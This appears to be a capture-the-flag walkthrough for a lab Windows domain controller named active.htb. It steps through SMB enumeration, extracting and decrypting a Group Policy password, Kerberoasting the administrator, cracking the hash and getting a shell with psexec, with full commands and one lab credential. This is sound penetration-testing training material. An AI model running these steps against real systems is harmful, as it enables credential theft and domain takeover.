1 - Enumerate ports

2 - When seeing that the machine is using Windows as OS and that the SMB port is open (445 - Microsoft DS) you can try to enumerate the service using "crackmapexec". Usage: crackmapexec smb __{VICTIM's-IP}__         

3 - Add the domain paired with the machin ip to the hosts file in /etc/hosts

4 - Try to enumerate objects in the domain using a smb client and a null session because of the lack of credentials to enter the server. Usage: smbclient -L __{VICTIM's-IP}__ -N 
- -L : Allows you to look at what services are available on the server 
- -N : Suppresses the normal password prompt from the client to the user. Used in a null session<br><br>
	4.1 - Because the port 88 is open and kerberos is running you can try to enumerate all the users of the server with the usage of kerbrute. Usage: kerbrute userenum --dc __{VICTIM's-IP}__ -d __{DOMAIN ex. active.htb}__ __{WORDLIST}__<br>
	4.2 - For kerberosting and ASREPRoast attack you've to be with the hour in the system equal to the server's one. Tool: ntpdate __{VICTIM's-IP}__

5 - After listing all the sharenames you can also list the privileges for each one of those shares. Usage: smbmap -H __{VICTIM's-IP}__
- -H : Stands for Host

6 - Right after that step, if a share is public, you can use the -r flag to extract all the information from that share. Usage: smbmap -H __{VICTIM's-IP}__ -r __{SHARE-NAME}__
- -r : List contents of a directory

7 - Because of the recognizable structure of the server we can tell this is a sysvol: 
- DfsrPrivate 
- Policies
- scripts

8 - While enumerating the service we've to look for Groups.xml because that file sometimes has the password hash to the service so that enables you to enter the system. In this machine particularly Gropus.xml is in the directory:
		Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences

9 - In order to download the file you can use smbmap like this: smbmap -H __{VICTIM's-IP}__ --download __{PATH}__/Groups.xml

10 - Once having the Groups.xml in our hands we can enter cat out the file and get the hash in the cpassword field. The hash will be like: edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ. Besides that, you also have to pay attention to the userName field in order to known which user that password stands for

11 - After getting the hash you can get the password by decrypting it with gpp-decrypt. Usage: gpp-decrypt __{HASH}__

12 - Once you've get the username and the password you can verify if they're correct with the usage of crackmapexec. Command: crackmapexec smb __{VICTIM's-IP}__ -u __{USER}__ -p __{PASS}__

13 - Now that you have an user you can list all the server shares again to see if you've access to a new-one. Usage: crackmapexec smb __{VICTIM's-IP}__ -u __{USER}__ -p __{PASS}__ --shares

14 - Now, because we've Read access to the users share we can enumerate it with smbmap with the following command: smbmap -H __{VICTIM's-IP}__ -u SVC_TGS -p GPPstillStandingStrong2k18 -r Users 
- -u and -p : Stands for Username and Password

15 - Enumerate till you get the user flag located in the desktop of the user SVC_TGS and download it with the previously named user with the flag --download

16 - Log into the service with rpcclient. Usage: rpcclient -U "__{USER}__%__{PASSWORD}__" __{VICTIM's-IP}__<br><br>
	&emsp;16.1 - Sometimes you can skip all the previous steps and try to connect with rpcclient with a null session. Way to do it: rpcclient -U "" __{VICTIM's-IP}__ -N<br>
	16.2 - If with the null session attack previously named you get a list of all the users in the server you can try to do an ASREPRoast

17 - Useful rpcclient commands: 
- _enumdomusers_ - Enumerate domain users of the domain controller
- _enumdomgropus_ - Enumerate domain groups of the domain controller
- _querygroupmem_ __{RID-OF-GROUP}__ - Enumerates the users that belong to the group with that RID
- _queryuser_ __{RID-OF-A-USER}__ - Gives you all the information on the server about a certain user
- _querydispinfo_ - Enumerates all the descriptions of the users in the domain controller

18 - After trying to do an ASREPRoast attack, as we can't seem to get any creedentials we can try using GetUserSPN.py instead of GETNpusers.py. Usage: GetUserSPN.py __{DOMAIN ex. active.htb}__/__{USER}__:__{PASSWORD}__
	18.1 - This attack will give us a TGS (Ticket Granting Service) of the admin through the usage of credentials previously retrieved from other attacks
	18.2 - After seeing that the tools gives us a response with a TGS of the admin we can add the flag -request to get the credentials for the admin account. Usage: GetUserSPN.py __{DOMAIN ex. active.htb}__/__{USER}__:__{PASSWORD}__ -request

19 - When you finally have the hash of the admin's password you can dump it into a file called hash and try to crack it. Way: john -w:{Wordlist} {Hash} 

20 - Download the root flag with the usage of smbmap and the parameter --download. Way: smbmap -H __{VICTIM's-IP}__ -u __{USER}__ -p __{PASS}__ --download Users/Administrator/Desktop/root.txt
	20.1 - Another way to get the flag could be gain system access with the use of psexec.py. Usage: psexec.py __{DOMAIN ex. active.htb}__/__{USER}__:__{PASS}__@__{VICTIM's-IP}__ cmd.exe